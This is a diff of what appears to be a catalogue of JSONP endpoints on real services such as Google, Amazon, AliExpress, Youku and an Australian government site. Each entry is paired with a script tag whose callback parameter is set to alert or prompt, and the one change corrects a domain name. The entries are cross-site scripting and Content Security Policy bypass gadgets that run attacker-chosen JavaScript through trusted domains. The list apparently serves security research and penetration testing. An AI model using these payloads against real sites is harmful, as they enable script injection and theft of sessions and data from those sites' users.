@@ -3,7 +3,7 @@ Domain	Code
 a.huodong.mi.com	<script src="https://a.huodong.mi.com/postfree/postfree?callback=alert"></script>
 abr.business.gov.au <script src="https://abr.business.gov.au/json/AcnDetails.aspx?callback=prompt(1)//"></script>
 acs.aliexpress.com	<script src="https://acs.aliexpress.com/h5/mtop.aliexpress.address.shipto.division.get/1.0/?type=jsonp&dataType=jsonp&callback=alert"></script>
-aax-us-east-retail-direct	<script src="https://aax-us-east-retail-direct.amazon.com/e/xsp/getAdj?callback=alert(1)-"></script>
+aax-us-east-retail-direct.amazon.com	<script src="https://aax-us-east-retail-direct.amazon.com/e/xsp/getAdj?callback=alert(1)-"></script>
 accdn.lpsnmedia.net	<script src="https://accdn.lpsnmedia.net/api/account/1/configuration/engagement-window/window-confs/1?cb=alert"></script>
 accounts.google.com	<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
 acs.youku.com	<script src="https://acs.youku.com/h5/mtop.youku.playlog.open.get/1.0/?jsv=2.6.1&appKey=24679788&t=1734359327631&sign=6b8f8b6abb27c68582606eed336c887d&api=mtop.youku.playlog.open.get&v=1.0&dataType=jsonp&jsonpIncPrefix=headerRecord1734359327618&type=jsonp&callback=alert&data={%22nlid%22%3A%22XlQcF5xQrCcCAWoLKdGqIOhS%22%2C%22uid%22%3A%22%22%2C%22pageLength%22%3A100%2C%22timestamp%22%3A%221734359327617%22%2C%22appKey%22%3A%22qPbb2hfIYugHjMaj%22%2C%22appName%22%3A%22pc%22%2C%22hwClass%22%3A1%2C%22deviceName%22%3A%22web%22%2C%22isPlayController%22%3A1%2C%22ccode%22%3A%220502%22%2C%22clientDrmAbility%22%3A3}"></script>
